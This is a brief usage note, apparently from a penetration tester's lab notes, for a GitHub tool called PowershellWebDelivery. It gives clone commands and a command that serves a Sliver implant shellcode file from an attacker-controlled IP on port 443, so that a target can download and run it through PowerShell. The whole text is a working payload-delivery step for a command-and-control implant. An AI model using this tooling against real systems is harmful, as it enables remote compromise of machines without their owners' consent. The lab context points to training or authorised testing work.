https://github.com/maxDcb/PowershellWebDelivery

Git clone

```bash
git clone https://github.com/maxDcb/PowershellWebDelivery
cd PowershellWebDelivery
# In order, the IP hosting the web server, the web server's port, and the raw shellcode
python3 PowershellWebDelivery.py --ip 10.10.15.250 --port 443 --raw /home/kali/work/prolab/sliver/CRAZY_TIMBALE.bin

```